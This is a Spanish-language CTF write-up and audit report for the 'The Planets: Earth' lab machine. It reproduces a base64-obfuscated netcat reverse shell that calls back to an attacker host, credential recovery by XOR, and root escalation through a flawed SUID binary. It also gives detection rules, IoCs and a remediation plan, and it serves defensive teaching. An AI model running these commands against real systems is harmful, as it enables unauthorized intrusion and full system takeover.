# CTF "THE PLANETS: EARTH"  
**Alcance:** Laboratorio / CTF sobre máquina Linux 192.168.131.130 (earth.local / terratest.earth.local).  
**Objetivo del informe:** Documento técnico exhaustivo, orientado a auditoría y remediación. Reproducción completa del ataque, análisis de raíz, impacto, evidencias, detección y plan de corrección priorizado.

 <div style="text-align: center;">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/The_Earth_seen_from_Apollo_17.jpg/960px-The_Earth_seen_from_Apollo_17.jpg" width="550" alt="Earth">
</div>

---

## 1. RESUMEN
Se comprometió una máquina Linux (192.168.131.130) mediante la combinación de: credenciales expuestas (mensajes cifrados pero presentes en la web), un panel web administrativo con ejecución de comandos (sin restricciones IP ni sanitización) y un binario con privilegios/SUID (reset_root) mal diseñado que permitió restablecer la contraseña root. Impacto final: escalada a `root` y extracción de flags. Riesgo: **ALTO/MÁXIMO** — acceso administrativo total y control remoto del sistema.

---

## 2. ENTORNO
**Host objetivo:** 192.168.131.130  
**Nmap (resumen provisto):**

PORT STATE SERVICE VERSION
- 2/tcp open ssh OpenSSH 8.6
- 80/tcp open http Apache httpd 2.4.51 (Fedora)
- 443/tcp open ssl/http Apache httpd 2.4.51 (cert SAN: earth.local, terratest.earth.local)

**Observaciones preliminares:**
- Certificados TLS usan CN/SAN internos (evidencia de entorno de pruebas).
- Métodos HTTP potencialmente inseguros (TRACE detectado).
- Panel administrativo disponible en `/admin` y sitio terratest.earth.local con `robots.txt` → `testingnotes.txt` → hints para descifrado (XOR).
- Resultado: credenciales `terra / earthclimatechangebad4humans` obtenidas por XOR sobre `testdata.txt`.

---

## 3. RECORRIDO TÉCNICO
> **Nota:** los comandos deben ejecutarse en un entorno controlado (máquina de laboratorio o VM). No ejecutar fuera de sistemas autorizados.

### 3.1 Preparación y descubrimiento de red
```bash
# Ver IP local (eth0)
ip a
```

# Descubrir hosts en LAN desde la interfaz
netdiscover -i eth0
# -> Host objetivo: 192.168.131.130

### 3.2 Escaneo de servicios
```bash
sudo nmap -sV -sC -T4 192.168.131.130 -oN nmap_scene.txt
```

- Interpreta scripts -sC para hints rápidos; -sV revela versiones.
- Resultado: SSH (22), HTTP (80), HTTPS (443).

### 3.3 Resolución de nombres para navegación
Añadir línea en /etc/hosts:
```bash
192.168.131.130 earth.local terratest.earth.local
```
Esto facilita navegaciones por nombre (certificados y rutas virtualhost).

### 3.4 Enumeración de directorios (web)
```bash
gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/common.txt -t 50
# detecta: /admin
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt -t 50
# detecta: /robots.txt -> /testingnotes.txt -> testdata.txt
```

### 3.5 Descifrado de mensajes (XOR) — obtención de credenciales
- testingnotes.txt indica: cifrado XOR, testdata.txt usado como key.
- Herramienta usada: CyberChef (GUI). También reproducible localmente:

Script Python reproducible (XOR):
```bash
# xor_decrypt.py
import sys
key = open('testdata.txt','rb').read()
data = open('encrypted_msg.txt','rb').read()
out = bytearray()
for i,b in enumerate(data):
    out.append(b ^ key[i % len(key)])
open('decrypted.txt','wb').write(out)
```

Resultado: terra / earthclimatechangebad4humans

### 3.6 Acceso al panel y ejecución de comandos
- Acceso en http://earth.local/admin con terra:earthclimatechangebad4humans.
- El panel expone un campo para ejecutar comandos (shell-like) como usuario apache.

Comandos usados:
```bash
whoami          # -> apache
ls /var/earth_web
cat /var/earth_web/user_flag.txt   # FLAG usuario
```

### 3.7 Evasión de restricciones y obtención de shell reversa
- El panel denegaba conexiones remotas directas; la solución fue codificar el payload en Base64 y decodificarlo en el servidor:

En atacante:
```bash
nc -lvnp 4444
```

Payload (conversión a base64):
```bash
echo 'nc -e /bin/bash 192.168.131.128 4444' | base64
# -> bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTMxLjEyOCA0NDQ0Cg==
```

En panel web:

```bash
echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTMxLjEyOCA0NDQ0Cg==' | base64 -d | bash
# Listener recibe conexión -> shell reversa
```

Mejora de shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### 3.8 Búsqueda de vectores de escalada (SUID / capabilities)

```bash
find / -perm -u=s 2>/dev/null
# encontrado: /usr/bin/reset_root
```

- Análisis estático/dinámico: strings, ltrace, strace, file, ldd.
- ltrace ./reset_root sugiere que busca/usa algunos archivos concretos; al crear esos archivos, la lógica del binario permite restablecer root.

Explotación:
```bash
# Crear los archivos que el binario espera
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe

# Ejecutar el binario SUID -> cambia la contraseña root a 'Earth' (según el test)
./reset_root

su root    # contraseña: Earth
cat /root/root_flag.txt  # FLAG root
```


## 4. ANÁLISIS DE VULNERABILIDADES (POR VECTOR)
Cada vulnerabilidad incluye: descripción técnica, mecanismo de explotación, riesgo y recomendaciones específicas.

4.1 VULNERABILIDAD A — Credenciales / secretos expuestos en código fuente (XOR)
- Descripción técnica: Información sensible (clave) embebida en contenidos web cifrados con XOR y disponible públicamente. Aunque XOR no es un cifrado seguro, la presencia del testdata.txt como key en el servidor permitió descifrado inmediato.
- Mecanismo: extracción de contenido (robots/testingnotes) → obtención de key (testdata) → XOR decrypt → credenciales.
- Impacto: Acceso inicial a panel administrativo (confidencialidad e integridad comprometidas).
- CVSS v3.1 (estimado): 7.5 (High) — vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

Recomendaciones:

- Eliminar cualquier secreto del contenido servido.
- Usar gestión de secretos centralizada (Vault, AWS Secrets Manager).
- Escanear repositorios y artefactos por credenciales con herramientas SAST y secrets detection (trufflehog, git-secrets).
- Revisión de contenido estático en web antes de despliegue.

## 4.2 VULNERABILIDAD B — Panel admin con ejecución de comandos sin restricciones ni sanitización
- Descripción técnica: El panel permite ejecutar comandos en el sistema como apache sin control, limitación o validación de entrada.
- Mecanismo: Inyección/ejecución de comandos remotos → reverse shell.
- Impacto: Compromiso del sistema a nivel de proceso web; facilita pivoting y escalada.
- CVSS (estimado): 9.8 (Critical) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Recomendaciones:

- Eliminar cualquier funcionalidad que ejecute comandos arbitrarios desde la interfaz.
- Si debe existir funcionalidad remota (para debug), restringir por IP, usar autenticación adicional (mTLS), registros exhaustivos y tiempo limitado.
- Implementar un WAF y reglas RASP para bloquear patrones sospechosos (payloads en base64, comandos habituales de shells).
- Validar entradas, evitar interpretes del sistema en el backend (no usar system(), exec() sin sanitización).

## 4.3 VULNERABILIDAD C — Binario SUID (/usr/bin/reset_root) mal implementado / falta de control
- Descripción técnica: Binario con bit SUID/privilegios sobre root que ejecuta lógicas inseguras (dependencia de archivos predecibles en /dev/shm o /tmp) y permite restablecer contraseña root.
- Mecanismo: creación de artefactos necesarios -> ejecución de SUID -> cambio de credenciales root.
- Impacto: Escalada directa a root. Compromiso total del sistema.
- CVSS (estimado): 9.8 (Critical) — AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (depende si exploit requiere acceso local o remoto, aquí remoto vía webshell -> alto)

Recomendaciones:

- Quitar SUID si no es necesario: chmod u-s /usr/bin/reset_root
- Revisar propósito funcional y reimplementar sin SUID. Si necesita capacidades puntuales, diseñar un wrapper seguro con validaciones estrictas y registro.
- Auditar todos los binarios SUID (find / -perm -4000 -type f) y evaluar su justificación.
- Aplicar control de integridad (AIDE/Tripwire).

## 5. IMPACTO 
- Confidencialidad: Expuesta (credenciales, archivos, flags, potenciales datos sensibles).
- Integridad: Comprometida (restablecimiento de credenciales root, ejecución de comandos).
- Disponibilidad: Riesgo medio (posible eliminación o manipulación de servicios).

## 6. EVIDENCIAS
Recolectar bajo cadena de custodia si corresponde. Trabajo en entorno CTF: recopilar snapshots.

**Logs Web**

- /var/log/httpd/access_log

- /var/log/httpd/error_log

**Logs sistema / autenticación**

- /var/log/secure o /var/log/auth.log

**Listado de procesos y conexiones**

 -ps aux > /tmp/ps_snapshot.txt

- netstat -tupan o ss -tupan

**Binario SUID**

- /usr/bin/reset_root — calcular hash: sha256sum /usr/bin/reset_root

- strings /usr/bin/reset_root > /tmp/reset_root.strings

- ltrace/strace outputs (si es posible, ejecutar en copia para evitar alterar original)

**Archivos introducidos por atacante**

- /dev/shm/kHgTFI5G, /dev/shm/Zw7bV9U5, /tmp/kcM0Wewe — listar y hash.

**Home directories, histfiles**

- Bash history del usuario web (/var/www/.bash_history, /home/apache/.bash_history, /root/.bash_history)

**Capturas de red**

- tcpdump -i any -w /tmp/capture.pcap

**Checksums y manifest**

- Crear TAR firmado de la evidencia y calcular sumas.

- Comandos ejemplo para recolección rápida:
```bash
mkdir -p /tmp/evidence && cd /tmp/evidence
cp /var/log/httpd/access_log ./access_log
cp /var/log/httpd/error_log ./error_log
sha256sum /usr/bin/reset_root > reset_root.sha256
strings /usr/bin/reset_root > reset_root.strings
tar czf evidence_$(date +%F_%T).tgz ./
```

## 7. IOC (Indicadores de Compromiso)
- IP atacante (ejemplo usada en laboratorio): 192.168.131.128

- Base64 payload -> bmMgLWUgL2Jpbi9iYXNo (prefijo común para nc -e /bin/bash)

- Nombres de archivos creados: /dev/shm/kHgTFI5G, /dev/shm/Zw7bV9U5, /tmp/kcM0Wewe

- Usuarios: terra, apache, root

- Rutas sensibles: /var/earth_web/user_flag.txt, /root/root_flag.txt, /usr/bin/reset_root

## 8. DETECCIÓN — REGLAS Y CONSULTAS (SAMPLES)
### 8.1 Suricata (regla ejemplo para payload base64 conocido)
```bash
   alert http any any -> any any (msg:"WEB-ATTACK Possible base64 reverse shell payload"; content:"bmMgLWUgL2Jpbi9iYXNo"; http_client_body; nocase; sid:1000001; rev:1;)
```

### 8.2 Splunk — búsqueda de payloads base64 en logs de Apache

```bash
index=web_logs sourcetype=access_combined
| search uri_query="*bmMgLWUgL2Jpbi9iYXNo*" OR uri="*bmMgLWUgL2Jpbi9iYXNo*"
| stats count by clientip, uri, _time
```

### 8.3 Auditd — monitorizar ejecución de binario SUID
Agregar regla audit:
```bash
-w /usr/bin/reset_root -p x -k reset_root_exec
```

Buscar eventos:

```bash
ausearch -k reset_root_exec
```

### 8.4 SIEM — correlación
- Correlacionar: accesos al panel /admin + POSTs que contienen cadenas base64 decodificables + conexiones salientes a puertos elevados (p.ej. 4444).
- Alerta si un usuario apache ejecuta nc, bash, python o similares.

## 9. PLAN DE REMEDIACIÓN (PRIORIDAD Y PASOS)
ACCIONES INMEDIATAS (0-24h)
- Rotar credenciales expuestas (cambiar contraseñas de todas las cuentas comprometidas).
- Eliminar / deshabilitar /usr/bin/reset_root SUID:
```bash
chmod u-s /usr/bin/reset_root
mv /usr/bin/reset_root /root/quarantine_reset_root.bin
```
(guardar copia para análisis forense).
- Cerrar panel administrativo: restringir por firewall (iptables/nftables) a IPs de gestión.
- Desplegar bloqueo temporal del sitio vulnerable (poner en mantenimiento) hasta parche.
- Revoque/regenere certificados si hay sospecha de manipulación.

URGENTE (24-72h)
- Auditar todos los binarios SUID (find / -perm -4000 -type f), justificar/suprimir.
- Eliminar archivos temporales no justificados (/dev/shm/*, /tmp/*) y aplicar políticas de creación segura.
- Habilitar y revisar logs (httpd, auth, syslog).
- Implementar reglas de detección en SIEM/IDS (basadas en IoCs).

MEDIO/PLAZO (1-2 semanas)
- Reescribir o eliminar cualquier funcionalidad de ejecución remota en paneles (evitar system()).
- Escaneo de repositorios y artefactos para detectar otros secretos.
- Implantación de gestión de secretos (Vault).
- Revisar políticas de hardening de Apache / Web server (disable TRACE, limit methods, headers sanitizing).
- Realizar pentest completo y retorno al proceso de remediación.

LARGO PLAZO (1-3 meses)
- Implantar CI/CD con SAST/DAST integrados; bloqueo de secretos en commits.
- Revisiones periódicas de binarios SUID y uso de capacidades.
- Formación a desarrolladores sobre manejo seguro de secretos y validación de entradas.

##  10. VERIFICACIONES POST-FIX
```bash
# Revisar SUID removido
find / -perm -4000 -type f -ls

# Revisar que /admin solo accesible desde IPs permitidas
curl -I http://earth.local/admin --connect-timeout 5

# Verificar que no existen archivos temporales sospechosos
ls -la /dev/shm | egrep 'kHgTFI5G|Zw7bV9U5'
ls -la /tmp | egrep 'kcM0Wewe'

# Comprobar que cadena base64 ya no aparece en logs
grep -R "bmMgLWUgL2Jpbi9iYXNo" /var/log/httpd/* || echo "OK - string not found"
```

## 11. CHANGES / HARDENING RECOMMENDATIONS (TÉCNICO)
Web:
- Deshabilitar métodos TRACE/PUT/DELETE si no usados.
- Habilitar Content Security Policy (CSP), HTTP-only and Secure cookies.
- Limitar tamaño y tipo de input; validar y sanitizar.
- Evitar ejecución de comandos desde interfaces web.

Sistema:
- Eliminar SUID innecesario; auditar setuid/setcap.
- Implementar SELinux/AppArmor en enforcing.
- Forzar autenticación fuerte (2FA) para accesos administrativos.

Red:
- ACLs en firewall para puertos administrativos (20000, 10000, 22, etc.).
- Segmentación de red: interfaces de administración en VLAN separada.

Procesos:
- Escaneo y eliminación de secretos en repos (Git history).
- Monitorización de integridad de ficheros (AIDE).
- Respuesta ante incidentes y playbook de recuperación.

## 12. MATRIZ RIESGO – PRIORIDAD
- SUID reset_root — CRÍTICO — acción inmediata (u-s / quarantena).
- Panel con ejecución remota — CRÍTICO — deshabilitar / restringir + parche.
- Credenciales expuestas — ALTA — rotación y políticas de secretos.
- Métodos HTTP inseguros — MEDIA — deshabilitar TRACE / Harden Apache.

13. POST-MORTEM SUGERIDO (PLANTILLA)
- Resumen del incidente: (qué pasó)
Fecha/hora detección: (registro)
- Vector inicial: (p.ej. credenciales en HTML)
- Ejecución: (pasos reproducidos)
- Impacto: (archivos y servicios comprometidos)
- Acciones inmediatas: (qué se hizo)
- Acciones de remediación: (listado con responsable y fecha)
- Lecciones aprendidas: (mejoras procesales)
- Seguimiento: (auditorías/fecha)

14. APÉNDICE A — COMANDOS Y SALIDAS (RAW)
Bloque con los comandos clave usados (lista para copiar/pegar en scripts de auditoría).
```bash
# Recon
ip a
netdiscover -i eth0
sudo nmap -sV -sC -T4 192.168.131.130 -oN nmap.out

# Hosts
echo "192.168.131.130 earth.local terratest.earth.local" | sudo tee -a /etc/hosts

# Enum web
gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/common.txt -t 50
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt -t 50

# Decrypt XOR (ejemplo)
python xor_decrypt.py

# Access panel
# credentials: terra / earthclimatechangebad4humans

# Reverse shell
# Escuchar
nc -lvnp 4444
# En web panel (base64)
echo 'nc -e /bin/bash 192.168.131.128 4444' | base64
# Ejecutar en panel:
echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTMxLjEyOCA0NDQ0Cg==' | base64 -d | bash

# Escalada: buscar SUID
find / -perm -u=s 2>/dev/null

# Crear ficheros y ejecutar reset_root
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
/usr/bin/reset_root
su root   # password: Earth
cat /root/root_flag.txt
```

15. CONCLUSIÓN
El compromiso fue posible por una cadena de malas prácticas: secretos embebidos, interfaz administrativa insegura y binarios SUID mal diseñados.
La prioridad inmediata es remover privilegios peligrosos (SUID), rotar credenciales, y restringir el panel administrativo.
A medio y largo plazo la organización/operador debe implantar controles de seguridad en desarrollo, gestión de secretos y monitorización continua.


# INFORME DE AUDITORÍA  
---

## 0) Notas previas importantes
- Este documento asume un entorno de laboratorio/CTF. Las recomendaciones técnicas suponen control y autorización sobre el sistema.  
- Antes de cualquier acción de remediación en entornos productivos, **preservar evidencia** (logs, binarios, captures) y documentar cadena de custodia.  
- Prioridad de acciones: Contención → Recolección forense → Remediación → Verificación → Prevención.

---
Se consiguió el compromiso completo del host `192.168.131.130` mediante una cadena encadenada de fallos: secretos embebidos y recuperables (clave de testdata + mensajes XOR) -> acceso administrativo a un panel web (`/admin`) que ejecutaba comandos sin controles ni sanitización -> uso del panel para obtener una shell reversa -> descubrimiento y explotación de un binario con bit SUID (`/usr/bin/reset_root`) que dependía de artefactos temporales predecibles, permitiendo el restablecimiento de la contraseña `root`. Impacto: control total del host (confidencialidad, integridad, disponibilidad afectadas). Riesgo organizativo si se replicara en producción: **CRÍTICO**.

---

## 2) Activos afectados y alcance
- **Host comprometido:** `192.168.131.130` (earth.local / terratest.earth.local)  
- **Servicios relevantes:** Apache HTTP/HTTPS (virtualhosts para `earth.local`, `terratest.earth.local`), panel administrativo en `/admin`.  
- **Usuarios involucrados:** `terra` (panel), `apache` (proceso web), `root`.  
- **Artefactos identificados:** `testdata.txt` (clave XOR), `/var/earth_web/user_flag.txt`, `/usr/bin/reset_root`, ficheros temporales en `/dev/shm` y `/tmp`.  
- **Impacto lateral:** si existieran credenciales reutilizadas o rutas de red, posibilidad de pivoting lateral.

---

## 3) Hallazgos técnicos

### 3.1 Credenciales/secretos expuestos en contenido web (XOR)
**Descripción técnica:** Contenido estático en el sitio apuntaba a mensajes cifrados con XOR y a un `testdata.txt` usado como clave. Dicha clave estaba y fue accesible públicamente en `terratest.earth.local`, permitiendo revertir el XOR y recuperar credenciales administrativas (`terra:earthclimatechangebad4humans`).  
**Por qué es crítico:** cualquier secreto embebido en contenido público es de facto comprometido. XOR no aporta seguridad real: si la clave es accesible, no existe confidencialidad.  
**Consecuencias:** acceso inicial al panel administrativo → escalada de la superficie de ataque.  
**CVSS aproximado:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)  
**Recomendación inmediata:** eliminar el archivo/clave; rotar credenciales; auditar repositorios y artefactos (historial git).

### 3.2 Panel administrativo con ejecución de comandos sin restricciones
**Descripción técnica:** El endpoint `/admin` exponía una interfaz que permitía ejecutar comandos del sistema (shell-like) como el usuario web (`apache`) sin validación, limitación de órdenes, ni whitelist. Los controles de acceso eran insuficientes (solo autenticación básica con credenciales recuperadas).  
**Por qué es crítico:** ejecutar comandos desde una interfaz web es diseño peligroso; sin controles, abre camino a RCE y pivoting.  
**Consecuencias:** obtención de shell, ejecución de payloads (reverse shell), posibilidad de exfiltración o persistencia.  
**CVSS aproximado:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**Recomendación inmediata:** deshabilitar funcionalidad; si es necesaria (debug), restringir por IP, usar autenticación fuerte (mTLS), revisar y limitar comandos permitidos.

### 3.3 Binario SUID inseguro `/usr/bin/reset_root`
**Descripción técnica:** Binario con bit SUID (permite ejecución con privilegios de owner, presumiblemente root) que, por diseño, buscaba/esperaba ciertos archivos temporales en `/dev/shm` o `/tmp`. Si se creaban esos artefactos predecibles, la lógica del binario permitía resetear la contraseña de root. El binario no validaba la procedencia/propietario de los archivos ni usaba rutas seguras.  
**Por qué es crítico:** SUID mal implementado permite escalada incondicional de privilegios.  
**Consecuencias:** escalada directa a `root`, control absoluto del host.  
**CVSS aproximado:** 9.8 (local->priv escalation; si se combina con web shell remoto, el vector se vuelve remota).  
**Recomendación inmediata:** remover bit SUID (`chmod u-s`), mover a cuarentena para análisis forense, auditar todos los SUID.

---

## 4) Cadena de ataque
1. **Descubrimiento de red:** `netdiscover -i eth0` detecta host objetivo en la red local (`192.168.131.130`).  
   - *Propósito auditoría:* Confirmar alcance IP y segmentación de red.  
2. **Fingerprinting de servicios:** `nmap -sV -sC` revela servicios (22, 80, 443) y certificados con SAN para `earth.local`/`terratest.earth.local`.  
   - *Por auditoría:* evaluar versiones y posibles CVE conocidas.  
3. **Enumeración web:** `gobuster` localiza `/admin` y, en otro vhost, `robots.txt -> testingnotes.txt` que remite a `testdata.txt`.  
   - *Por auditoría:* detectar revelación de paths y archivos informativos.  
4. **Recuperación de credenciales:** `testdata.txt` usado como key XOR para descifrar mensajes embebidos (CyberChef o script reproducible). Resultado: credenciales `terra:earthclimatechangebad4humans`.  
   - *Por auditoría:* reproducir con script y documentar la debilidad criptográfica.  
5. **Acceso al panel y ejecución de comandos:** Login con `terra`, uso del campo para ejecutar comandos (sin restricciones) → `whoami` → `apache`; lectura de `user_flag.txt`.  
   - *Por auditoría:* evidencia de privilegios web sin control.  
6. **Evasión de filtros / reverse shell:** el panel bloqueaba conexiones remotas directas; el atacante codificó `nc -e /bin/bash <IP> <PORT>` en Base64, lo decodificó en servidor y abrió conexión al listener.  
   - *Por auditoría:* demuestra falta de WAF/RASP y ausencia de inspección profunda de payloads.  
7. **Escalada a root:** búsqueda de SUID (`find / -perm -u=s`) revela `/usr/bin/reset_root`; análisis dinámico/estático muestra dependencia de ficheros en `/dev/shm` o `/tmp`; creando esos ficheros y ejecutando el binario se restablece contraseña `root`. `su root` → `cat /root/root_flag.txt`.  
   - *Por auditoría:* fallo de diseño SUID + rutas temporales predecibles.

---

## 5) Riesgo de negocio y métricas relevantes
- **Impacto sobre confidencialidad:** alta — posibles secretos y datos expuestos (si hubiera datos reales).  
- **Impacto sobre integridad:** alta — posibilidad de modificar cuentas, binarios, configuraciones.  
- **Impacto sobre disponibilidad:** medio/alto — reinicio/paro de servicios, manipulación de backups.  
- **Riesgo reputacional y cumplimiento:** alto si se tratara de datos reales; posibles incumplimientos normativos (GDPR, ISO/IEC 27001) en producción.  
- **Métrica prioritaria:** riesgo crítico hasta que SUID sea neutralizado y credenciales rotadas.

---

## 6) Indicadores de compromiso (IoC) — lista priorizada
- IP atacante: `192.168.131.128` (ejemplo de laboratorio).  
- Strings ocurrencias en logs: Base64 de `nc -e /bin/bash` → prefijo `bmMgLWUgL2Jpbi9iYXNo`. Buscar entradas HTTP POST/GET con ese contenido.  
- Archivos temporales sospechosos: `/dev/shm/kHgTFI5G`, `/dev/shm/Zw7bV9U5`, `/tmp/kcM0Wewe`.  
- Binario SUID: `/usr/bin/reset_root` (hash y timestamp).  
- Rutas/flags: `/var/earth_web/user_flag.txt`, `/root/root_flag.txt`.  
- Recuento de procesos: procesos `nc`, `bash` ejecutados por user `apache`.  
- Certificado TLS con SAN: `earth.local`, `terratest.earth.local`.

---

## 7) Evidencias
**Principio:** recolectar antes de remediar. Usar un host remoto seguro para copiar los artefactos. Registrar timestamps y procedimientos.

**Comandos de recolección inicial (ejecutar desde el host objetivo como root preferiblemente con captura de salida a /tmp/evidence):**
```bash
mkdir -p /tmp/evidence && cd /tmp/evidence
# Logs
cp /var/log/httpd/access_log ./access_log || cp /var/log/apache2/access.log ./access_log
cp /var/log/httpd/error_log ./error_log || cp /var/log/apache2/error.log ./error_log
cp /var/log/auth.log ./auth_log 2>/dev/null || cp /var/log/secure ./auth_log 2>/dev/null

# Binario SUID
cp /usr/bin/reset_root ./reset_root.bin
sha256sum ./reset_root.bin > reset_root.bin.sha256
strings ./reset_root.bin > reset_root.strings

# Artefactos temporales
for f in /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe; do
  [ -e "$f" ] && cp "$f" ./ || true
done

# Flags / archivos web
cp /var/earth_web/user_flag.txt ./user_flag.txt 2>/dev/null || true
cp /root/root_flag.txt ./root_flag.txt 2>/dev/null || true

# Process & netstat snapshot
ps aux > ps_snapshot.txt
ss -tupan > netstat_snapshot.txt

# Pack evidence (avoid altering metadata unnecessarily)
tar czf /root/evidence_$(date +%F_%T).tgz ./
```

Nota forense: No ejecutar strings/ltrace/strace sobre el binario en su ubicación original si se pretende analizar pristine sample; mejor trabajar sobre copia. Documentar checksums y permisos. Registrar todo en un ticket forense.


## 8) Plan de Mitigación
Fase A — Contención inmediata (0–24h)
- Aislar host (net quarantine) — aplicar regla en firewall/switch para bloquear tráfico no administrativo. Responsable: Infra.
- Recolectar evidencia (ver sección 7) y exportarla fuera del host. Responsable: IR/Forense.
- Desactivar funcionalidad peligrosa del panel: poner en mantenimiento o bloquear endpoint /admin por IP. Ejemplo (iptables):
```bash
# Permitir solo IPs de administracion y bloquear resto
sudo iptables -I INPUT -p tcp --dport 80 -s <IP_ADMIN> -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 80 -j DROP
```
Responsable: App Owner / Infra.
- Desactivar bit SUID del binario:
```bash
sudo chmod u-s /usr/bin/reset_root
sudo mv /usr/bin/reset_root /root/quarantine_reset_root.bin
sudo sha256sum /root/quarantine_reset_root.bin > /root/quarantine_reset_root.bin.sha256
```
Responsable: Infra / SecOps.

Fase B — Remediación urgente (24–72h)
- Rotar credenciales recuperadas y forzar cambio de contraseñas en todas las cuentas que las usan. Responsable: IAM / App Owner.
- Eliminar secretos en contenido web (testdata.txt y otros); realizar escaneo de repositorios (git history) y remover historial si necesario. Herramientas: trufflehog, git-secrets. Responsable: DevOps.
- Parchear o eliminar endpoint de ejecución remota; reescribir la funcionalidad para usar un backend seguro o eliminarla. Responsable: Dev.
- Auditoría SUID y capabilities:
```bash
find / -perm -4000 -type f -exec ls -l {} \; > /tmp/suid_list.txt
getcap -r / 2>/dev/null > /tmp/capabilities.txt
```
Revisar y justificar cada binario. Responsable: Infra / SecOps.

Fase C — Medio plazo (1–4 semanas)
- Implementar gestión centralizada de secretos (Vault / KeyVault). Migrar secretos fuera de código y revisar pipeline CI/CD. Responsable: DevSecOps.
- Hardening web server — deshabilitar métodos TRACE, aplicar TLS fuerte, HSTS, CSP, cookies Secure/HttpOnly. Ejemplo Apache:
```bash
# disable TRACE
TraceEnable off

# HSTS
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

# Disable server signature
ServerSignature Off
ServerTokens Prod
```

Responsable: Infra / App Owner.
- Implementar WAF y RASP con reglas que bloqueen payloads base64 sospechosos y comandos en parámetros. Responsable: SecOps.

Fase D — Largo plazo (1–3 meses)
- SAST/DAST en CI/CD para detectar system()/exec() y secretos.
- Política y revisión de binarios SUID con aprobación formal y registro de cambios.
- Formación para desarrolladores sobre manejo de secretos y diseño seguro.
- Simulacros y pentesting periódicos para validar controles.

## 9) Verificación y pruebas post
Antes de remediar: copiar evidence y hashes.
Checks de validación (ejecutar tras aplicar correcciones):
```bash
# SUID list (debe no contener reset_root)
find / -perm -4000 -type f -ls

# Artefactos temporales no deben existir
ls -la /dev/shm | egrep 'kHgTFI5G|Zw7bV9U5' || echo "OK - artefactos no presentes"
ls -la /tmp | egrep 'kcM0Wewe' || echo "OK - artefactos no presentes"

# Strings base64 sospechosos no en logs
grep -R "bmMgLWUgL2Jpbi9iYXNo" /var/log/httpd/* || echo "OK - string not found"

# Endpoint /admin inalcanzable desde internet
curl -I http://earth.local/admin --connect-timeout 5 || echo "OK - /admin no accesible"
```

Pruebas funcionales: confirmar que el panel administrativo sigue disponible solo para IPs autorizadas y bajo autenticación fuerte; ejecutar un pentest de verificación (scoped).

## 10) Detección y reglas
A. Suricata (regla para base64 reverse shell fragment):
```
alert http any any -> any any (msg:"WEB-ATTACK base64 reverse shell fragment"; content:"bmMgLWUgL2Jpbi9iYXNo"; http_client_body; nocase; sid:10000010; rev:1;)
```
B. Auditd (monitor ejecución binario):
```
-w /usr/bin/reset_root -p x -k reset_root_exec
```
C. Splunk (búsqueda de payloads base64 / nc):
```
index=web_logs sourcetype=access_combined
| search uri_query="*bmMgLWUgL2Jpbi9iYXNo*" OR uri="*bmMgLWUgL2Jpbi9iYXNo*" OR _raw="*nc -e /bin/bash*"
| stats count by clientip, uri, _time
```
D. Elastic (KQL) ejemplo:
```
http.request.body:*bmMgLWUgL2Jpbi9iYXNo* or http.request.body:*nc -e /bin/bash*
```

## 11) Matriz de priorización (Riesgo → Acción → SLA)
- SUID reset_root — CRÍTICO — Acción: deshabilitar, cuarentenar, forense. SLA: 0–24h.
- Panel ejecución remota — CRÍTICO — Acción: restringir/deshabilitar + parche. SLA: 0–24h.
- Credenciales expuestas — ALTA — Acción: eliminar, rotar, auditar repos. SLA: 0–48h.
- Métodos HTTP inseguros / falta de WAF — MEDIA — Acción: hardening web + WAF. SLA: 1–14 días.

## 12) Recomendaciones de Hardenings técnicas
- Gestión de secretos: Vault + políticas RBAC; no secretos en repos; escaneo histórico git y purge con git filter-repo si es necesario.
- Control de ejecución: no exponer system() ni shell execution en endpoints públicos; si necesario, usar colas internas, autenticadas y whitelisted.
- Binarios privilegiados: eliminar SUID innecesarios; si son necesarios, reescribir con mínimo privilegio (drop to root solo para la porción necesaria), validar propietarios de archivos y usar rutas absolutas no controlables por usuarios.
- Logging y detección: habilitar logging a SIEM, correlación entre web logs y netflow; reglas para detectar patrones base64/obfuscation.
- Segmentación de red: separar administración en VLAN y permitir accesos únicamente desde jump hosts.
- Políticas operativas: revisiones pre-despliegue (security gate) para cualquier endpoint que ejecute código o maneje secretos.

13) Plan de verificación oficiosa (post)
- Paso 1: Recolectar evidencia post-fix y comparar hashes (binario, logs) con las copias originales.
- Paso 2: Ejecutar escaneo completo (nmap, gobuster) para verificar que endpoints críticos no son accesibles.
- Paso 3: Auditoría de SUID, revisar y justificar cada entrada. Registrar excepciones en CMDB.
- Paso 4: Realizar pentest de verificación (scope: host) y validar que vectores explotables han sido mitigados.
- Paso 5: Revisar métricas en SIEM por 7 días para detectar cualquier intento de re-explotación.

## 14) Lecciones aprendidas / causa raíz organizativa
- Gestión inadecuada de secretos y ausencia de revisión de contenido estático.
- Falta de separación entre funcionalidades de debug y producción (endpoint de ejecución de comandos accesible).
- Débil gobernanza sobre binarios privilegiados (SUID no auditado).
- Falta de controles de detección/inspección avanzada (payload obfuscation, base64).
- Recomendación de gobernanza: introducir un checklist obligatorio pre-prod que incluya: secretos scan, SAST y revisión de endpoints que puedan ejecutar código.

## 15) Conclusión ampliada
